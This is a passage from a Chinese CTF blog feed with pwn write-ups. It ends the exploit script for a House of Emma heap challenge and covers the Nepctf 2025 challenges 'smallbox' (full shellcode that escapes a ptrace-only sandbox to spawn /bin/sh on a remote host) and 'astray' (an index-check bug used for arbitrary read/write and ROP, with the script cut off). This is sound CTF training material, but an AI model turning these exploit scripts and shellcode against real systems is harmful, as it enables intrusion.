然后右移64-n位，将左移时超出的位移动回来</span></span><br><span class="line">    right_shift = (x &gt;&gt; (<span class="number">64</span> - n)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    <span class="comment"># 合并两部分</span></span><br><span class="line">    <span class="keyword">return</span> left_shift | right_shift</span><br><span class="line"></span><br><span class="line">script=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x18B6)</span></span><br><span class="line"><span class="string">b *$rebase(0x12D7)</span></span><br><span class="line"><span class="string">b __vfprintf_internal</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gdb.attach(io,script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------- leak libc</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x430</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">run()</span><br><span class="line">io.recvuntil(<span class="string">&quot;Del Done\nMalloc Done\n&quot;</span>)</span><br><span class="line">libc_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f30b0</span></span><br><span class="line">logv(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2daa2</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x37c0a</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x1066e1</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x446c0</span></span><br><span class="line">syscall=libc_base+<span class="number">0x883b6</span> </span><br><span class="line">stderr=libc_base+libc.sym[<span class="string">&quot;stderr&quot;</span>]</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr=libc_base+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write=libc_base+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">_IO_cookie_jumps = libc_base + <span class="number">0x1f3ae0</span></span><br><span class="line">guard = libc_base+ <span class="number">0x2cc770</span></span><br><span class="line"><span class="comment">#----------------------------------leak heap</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">run()</span><br><span class="line">io.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x2ae0</span></span><br><span class="line">logv(<span class="string">&quot;heap&quot;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment">#----------------------------------largein attack stderr </span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x1f30b0</span>)*<span class="number">2</span> + p64(heap_base +<span class="number">0x2ae0</span>) + p64(stderr - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x22a0</span>) + p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x22a0</span>) * <span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x2ae0</span>) * <span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x420</span>)</span><br><span class="line">run()   </span><br><span class="line"><span class="comment">#----------------------------------largebin attack guard , TLS 地址偏移不固定，直接手改吧</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x430</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base + <span class="number">0x1f30b0</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0x2ae0</span>) + p64(guard - <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x450</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x22a0</span>) + p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x22a0</span>) * <span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x2ae0</span>) * <span class="number">3</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">run()</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x430</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x438</span> + p64(<span class="number">0x300</span>))</span><br><span class="line">run()</span><br><span class="line"><span class="comment">#----------------------------------写 orw</span></span><br><span class="line">flag = heap_base + <span class="number">0x22a0</span> + <span class="number">0x260</span></span><br><span class="line">orw = p64(pop_rdi)+p64(flag)</span><br><span class="line">orw+= p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">orw+= p64(pop_rax)+p64(<span class="number">2</span>)</span><br><span class="line">orw+= p64(syscall)</span><br><span class="line"></span><br><span class="line">orw+= p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">orw+= p64(pop_rsi)+p64(heap_base+<span class="number">0x1050</span>)</span><br><span class="line">orw+= p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+= p64(read_addr)</span><br><span class="line"></span><br><span class="line">orw+= p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">orw+= p64(pop_rsi)+p64(heap_base+<span class="number">0x1050</span>)</span><br><span class="line">orw+= p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+= p64(write)</span><br><span class="line"><span class="comment">#----------------------------------伪造fake io</span></span><br><span class="line">chunk0 = heap_base + <span class="number">0x22a0</span></span><br><span class="line">gadget = libc_base + <span class="number">0x146020</span>  <span class="comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">xor_key = chunk0</span><br><span class="line">fake_io = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># IO_read_end IO_read_base</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># IO_write_base IO_write_ptr IO_write_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># IO_buf_base IO_buf_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">8</span> <span class="comment">#_IO_save_base ~ _codecvt</span></span><br><span class="line">fake_io += p64(heap_base) + p64(<span class="number">0</span>)*<span class="number">2</span>  <span class="comment">#_lock   _offset  _codecvt</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io += p64(_IO_cookie_jumps+<span class="number">0x38</span>) <span class="comment">#vtable 0xd8</span></span><br><span class="line">rdi_data = chunk0 + <span class="number">0xf0</span></span><br><span class="line">rdx_data = chunk0 + <span class="number">0xf0</span></span><br><span class="line"></span><br><span class="line">encrypt_gadget = rotate_left_64(gadget^xor_key,<span class="number">0x11</span>)</span><br><span class="line">fake_io += p64(rdi_data) <span class="comment"># 0xe0</span></span><br><span class="line">fake_io += p64(encrypt_gadget) <span class="comment"># 0xe8</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>) + p64(rdx_data) <span class="comment"># 0xf0,0xf8</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(setcontext + <span class="number">61</span>) <span class="comment">#0x100,0x108,0x110</span></span><br><span class="line">fake_io += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">fake_io += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa0</span> - <span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># fake_io += p64(0)*2</span></span><br><span class="line">fake_io += p64(chunk0+<span class="number">0x1a0</span>)+p64(pop_rdi+<span class="number">1</span>)</span><br><span class="line">fake_io += orw</span><br><span class="line">fake_io += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">fake_io += <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,fake_io)</span><br><span class="line">run()</span><br><span class="line"><span class="comment">#---------------------------------- house of emma</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x4c0</span>)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> house of XXX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nepctf-2025-pwn</title>
      <link href="/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/Nepctf-2025-pwn%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/Nepctf-2025-pwn%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Nepctf–pwn复现"><a href="#Nepctf–pwn复现" class="headerlink" title="Nepctf–pwn复现"></a>Nepctf–pwn复现</h1><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><h2 id="smallbox"><a href="#smallbox" class="headerlink" title="smallbox"></a>smallbox</h2><h3 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h3><p>题目名字和描述都很明显，拖下来首先就是看一下沙箱。发现只允许一个syscall，ptrace。之前也没遇到过这类题目，先去了解了一下。</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093312153.png" alt="image-20250728093312153"></p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>先用mmap分配了一块空间，并给了可读可写可执行的权限。然后fork，然后read，然后上沙箱。最后会调用shellcode。</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093914695.png" alt="image-20250728093914695"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>1.沙箱禁用了其他函数，只能使用ptrace 操作。可以获取子进程pid，所以可以操作子进程。 因为沙箱再后面install ，但是子进程出来一直在循环，所以还没装沙箱。</p><p>2.利用ptrace修改子进程rip，使其跳过沙箱。同时通过ptrace 往子进程的空间中写入shellcode ，最后让子进程跳转到这，因为没有沙箱，所以子进程就可以getshell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>当时写的时候，没有通过ptrace,去往里写，以为父进程中读入的shellcode，子进程也有。反复尝试了很久，都失败了。还以为是attach 失败，又或者是改rip错了。后面意识到，一个点，父进程中输入的shellcdoe ，子进程不应该有才对，才反应过了同过ptrace往里写。也是学到了。</p><p>之前看到fork 只能联想到爆破cananry，现在知道可以通过ptrace控制子进程了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#io,elf=loadfile(&quot;./smallbox&quot;,&quot;&quot;,0)</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;66%&#x27;]</span></span><br><span class="line">host=<span class="string">&quot;nepctf31-oted-rgpe-shrp-juf9qwjd6957.nepctf.com&quot;</span></span><br><span class="line">port=<span class="number">443</span></span><br><span class="line">io= remote(host, port, ssl=<span class="literal">True</span>, sni=host)</span><br><span class="line">execve_shellcode=(</span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC0\x3b\x00\x00\x00&#x27;</span> <span class="comment"># mov rax,0x3b</span></span><br><span class="line"><span class="string">b&#x27;\x48\xBF\x19\xE0\x0D\xDC\xEA\x0D\x00\x00&#x27;</span> <span class="comment"># mov rdi,0xdeadc0de019</span></span><br><span class="line"><span class="string">b&#x27;\x48\x31\xf6&#x27;</span>   <span class="comment"># xor rsi,rsi</span></span><br><span class="line"><span class="string">b&#x27;\x48\x31\xD2&#x27;</span>   <span class="comment"># xor rdx,rdx</span></span><br><span class="line"><span class="string">b&#x27;\x0f\x05&#x27;</span>       <span class="comment"># syscall</span></span><br><span class="line"><span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode=(</span><br><span class="line"><span class="string">b&#x27;\x44\x8B\x7D\xF4&#x27;</span> <span class="comment"># mov r15d,[rbp-0xc]</span></span><br><span class="line"><span class="string">b&#x27;\x44\x89\xFe&#x27;</span>     <span class="comment"># mov edi,r15d</span></span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC0\x65\x00\x00\x00&#x27;</span> <span class="comment"># mov rax,101</span></span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC7\x10\x00\x00\x00&#x27;</span> <span class="comment"># mov rsi,10h</span></span><br><span class="line"><span class="string">b&#x27;\x48\x31\xD2&#x27;</span>   <span class="comment"># xor rdx,rdx</span></span><br><span class="line"><span class="string">b&#x27;\x4D\x31\xD2&#x27;</span>   <span class="comment"># xor r10,r10</span></span><br><span class="line"><span class="string">b&#x27;\x0f\x05&#x27;</span>       <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;\x44\x89\xFe&#x27;</span>     <span class="comment"># mov edi,r15d</span></span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC0\x65\x00\x00\x00&#x27;</span> <span class="comment"># mov rax,101</span></span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC7\x0c\x00\x00\x00&#x27;</span> <span class="comment"># mov rsi,ch</span></span><br><span class="line"><span class="string">b&#x27;\x48\x31\xD2&#x27;</span>   <span class="comment"># xor rdx,rdx</span></span><br><span class="line"><span class="string">b&#x27;\x49\xBA\x00\xE5\x0D\xDC\xEA\x0D\x00\x00&#x27;</span>   <span class="comment"># mov r10,0x0deadc0de500</span></span><br><span class="line"><span class="string">b&#x27;\x0f\x05&#x27;</span>       <span class="comment"># syscall</span></span><br><span class="line">)</span><br><span class="line">shellcode+=(</span><br><span class="line"><span class="string">b&#x27;\x49\xB8\x00\xE0\x0D\xDC\xEA\x0D\x00\x00&#x27;</span>   <span class="comment"># mov r8,0x0deadc0de000</span></span><br><span class="line"><span class="string">b&#x27;\x49\xB9\x00\xE2\x0D\xDC\xEA\x0D\x00\x00&#x27;</span>   <span class="comment"># mov r8,0x0deadc0de200</span></span><br><span class="line">)</span><br><span class="line">shellcode+=<span class="number">4</span>*(</span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC0\x65\x00\x00\x00&#x27;</span> <span class="comment"># mov rax,101</span></span><br><span class="line"><span class="string">b&#x27;\x44\x89\xFe&#x27;</span>     <span class="comment"># mov edi,r15d</span></span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC7\x05\x00\x00\x00&#x27;</span> <span class="comment"># mov rsi,10h</span></span><br><span class="line"><span class="string">b&#x27;\x4C\x89\xC2&#x27;</span> <span class="comment"># mov rdx, r8</span></span><br><span class="line"><span class="string">b&#x27;\x4D\x8B\x11&#x27;</span><span class="comment">#mov  r10, [r9]</span></span><br><span class="line"><span class="string">b&#x27;\x0f\x05&#x27;</span>       <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;\x49\x83\xC0\x08&#x27;</span> <span class="comment"># add r8+8</span></span><br><span class="line"><span class="string">b&#x27;\x49\x83\xC1\x08&#x27;</span> <span class="comment"># add r8+8</span></span><br><span class="line">)</span><br><span class="line">shellcode+=(</span><br><span class="line"><span class="string">b&#x27;\x49\xB9\x00\xE0\x0D\xDC\xEA\x0D\x00\x00&#x27;</span> <span class="comment">#  mov r9,0x0deadc0de200</span></span><br><span class="line"><span class="string">b&#x27;\x49\xB8\x00\xE5\x0D\xDC\xEA\x0D\x00\x00&#x27;</span>   <span class="comment"># mov r8,0x0deadc0de500</span></span><br><span class="line"><span class="string">b&#x27;\x4D\x89\x88\x80\x00\x00\x00&#x27;</span>             <span class="comment">#  mov    [r8+0x80],r9</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;\x44\x89\xFe&#x27;</span>     <span class="comment"># mov edi,r15d</span></span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC0\x65\x00\x00\x00&#x27;</span> <span class="comment"># mov rax,101</span></span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC7\x0d\x00\x00\x00&#x27;</span> <span class="comment"># mov rsi,dh</span></span><br><span class="line"><span class="string">b&#x27;\x48\x31\xD2&#x27;</span>   <span class="comment"># xor rdx,rdx</span></span><br><span class="line"><span class="string">b&#x27;\x49\xBA\x00\xE5\x0D\xDC\xEA\x0D\x00\x00&#x27;</span>   <span class="comment"># mov r10,0x0deadc0de500</span></span><br><span class="line"><span class="string">b&#x27;\x0f\x05&#x27;</span>       <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;\x44\x89\xFe&#x27;</span>     <span class="comment"># mov edi,r15d</span></span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC0\x65\x00\x00\x00&#x27;</span> <span class="comment"># mov rax,101</span></span><br><span class="line"><span class="string">b&#x27;\x48\xC7\xC7\x11\x00\x00\x00&#x27;</span> <span class="comment"># mov rsi,17h</span></span><br><span class="line"><span class="string">b&#x27;\x48\x31\xD2&#x27;</span>   <span class="comment"># xor rdx,rdx</span></span><br><span class="line"><span class="string">b&#x27;\x4D\x31\xD2&#x27;</span>   <span class="comment"># xor r10,r10</span></span><br><span class="line"><span class="string">b&#x27;\x0f\x05&#x27;</span>       <span class="comment"># syscall</span></span><br><span class="line">)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    jmp loop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x61&#x27;</span>)</span><br><span class="line">shellcode+=execve_shellcode</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="astray"><a href="#astray" class="headerlink" title="astray"></a>astray</h2><h3 id="ida-分析"><a href="#ida-分析" class="headerlink" title="ida 分析"></a>ida 分析</h3><p>首先这题很绕，几个地址跳来跳去的，我们要先从init详细分析清楚结构</p><table><thead><tr><th>地址</th><th>保存内容</th></tr></thead><tbody><tr><td>manage_physic[0]</td><td>heap_addr</td></tr><tr><td>magnage_physic[2*i]    (偶数项)</td><td>heap_addr+256*i</td></tr><tr><td>heap2</td><td>0</td></tr><tr><td>heap2+0x8</td><td>0</td></tr><tr><td>heap2+0x10</td><td>0</td></tr><tr><td>V3</td><td>heap_addr</td></tr><tr><td>heap_addr</td><td>1</td></tr><tr><td>heap_addr+0x8</td><td>heap3</td></tr><tr><td>heap_addr+0x10</td><td>&amp;onlyuser</td></tr><tr><td>heap3</td><td>0</td></tr><tr><td>heap3+0x8</td><td>0</td></tr><tr><td>heap3+0x10</td><td>0</td></tr></tbody></table><p>可以看到，mange_pyhsic , heap2 ，heap_addr(heap1),heap3,几个变量，其中，heap1，heap3，不在bss上，user中依靠heap2去寻址，manage中依靠heap1去寻址。寻址通过idx ，从manage_physic中赋值给heap2，和heap3 。这里有一个逻辑漏洞，在check中。</p><h4 id="check函数"><a href="#check函数" class="headerlink" title="check函数"></a>check函数</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804134532550.png" alt="image-20250804134532550"></p><p>这里只检测，idx大于等于0x14也就是20 ，但没有检测下限，如果这里的idx等于0，那么后面赋值时，就会发生巨大的变化。同时，两个用户可以互用对方的操作。</p><p>但是在check函数还有一个检测，如果是idx是0 ，即 n0x14&#x3D;0，那么v5&#x3D; manage_physic.所以v5[1]&#x3D;*(manage_physic+8),也就是0x10，是过不了检测的。</p><p>正常情况下，我们会读写magnage_physic[2*i] 中的内容，但是如果i&#x3D;0，在User中，我们可以写heap1 这个堆块的内容 ，这里可以修改掉其上的指针，如果后续可以对其上的指针进行读写，那就可以任意地址读写。在manage中会有不同</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804143259945.png" alt="image-20250804143259945"></p><p>这里有两个可以读写的地址，** (heap+8),是heap3，也就是与idx相关的。** （ *  （heap+16）+ 8），这是 ** heap2，也就是user中 依靠的寻址方式。同时补充一下对权限的检测</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804162343842.png" alt="image-20250804162343842"></p><p>在初始化时，这里对每一个块都初始了权限，那么其实对&amp; 运算稍微了解一下就知道了。因为manage_physic[0]的权限是0x10，很特殊，似乎manage和user都没有权限去修改。但是，如果进入manage时，<strong>使用user_write去执行呢，似乎可以避开权限的检测</strong>，但是后续会继续检测，也无法往里write。</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><h4 id="通过MANAGE-visit"><a href="#通过MANAGE-visit" class="headerlink" title="通过MANAGE_visit"></a>通过MANAGE_visit</h4><p>因为直接使用两个write都过不了检测，但是我们使用manage_visit 可以轻松过check，只要heap2不为空。也就说，只要在usr中，过check赋值，就可以在manage中读写。那么我们进入usr_operation,输入MANAGE_visit，就可以过check赋值，而且不做读写操作。此时heap2[0]&#x3D;heap_addr.<br>再从manage_operation中读，可以读到pie和堆的地址信息。再写，就可以覆盖heap1 中 的内容。如果选择覆盖heap1+0x8，那么下次准备往目标写的时候，这个位置又会被覆盖掉。<br>所以，只能通过heap1+0x10的位置来完成任意地址读写。我们把改写后的地方称为fake_addr(位置与&amp;onlyuser位置重合),那么我们之后从manage中访问到的就是** (fake_addr+0x8).</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805013545343.png" alt="image-20250805013545343"></p><h4 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h4><p>这样看就清楚很多，如果我们把heap1+0x10 修改为 heap3-8，那么我们可以通过manage_write,修改* (magnage_physic[2*i])，继而通过manage_visit,去任意地址读写。</p><h4 id="泄露stack，再rop"><a href="#泄露stack，再rop" class="headerlink" title="泄露stack，再rop"></a>泄露stack，再rop</h4><p>有读写，泄露的思路自然不用多说。那最后如何getshell呢？保护机制全开，不能修改got，排除syscall和 shellcode ，那就只能rop了，所以还要泄露栈地址。通过libc中的environ泄露栈地址，这个地址与返回地址的偏移动调直接看就行。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;66%&#x27;]</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./astray&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#manager=0x41A8</span></span><br><span class="line"><span class="comment"># 0x4060</span></span><br><span class="line">pop_rdi=<span class="number">0x2a3e5</span></span><br><span class="line">ret=<span class="number">0x29139</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>(<span class="params">op,idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Which permission do you want to log in with?(1:manager 1000:user)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;visit user(MANAGER_visit)\n&quot;</span>)</span><br><span class="line">    io.send(op)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;1-19: manager can visit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>(<span class="params">op,idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Which permission do you want to log in with?(1:manager 1000:user)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1000</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;user write to logs(USER_write)\n&quot;</span>)</span><br><span class="line">    io.send(op)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;10-19: user can visit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager_read</span>():</span><br><span class="line">manager(<span class="string">&quot;MANAGER_read&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span 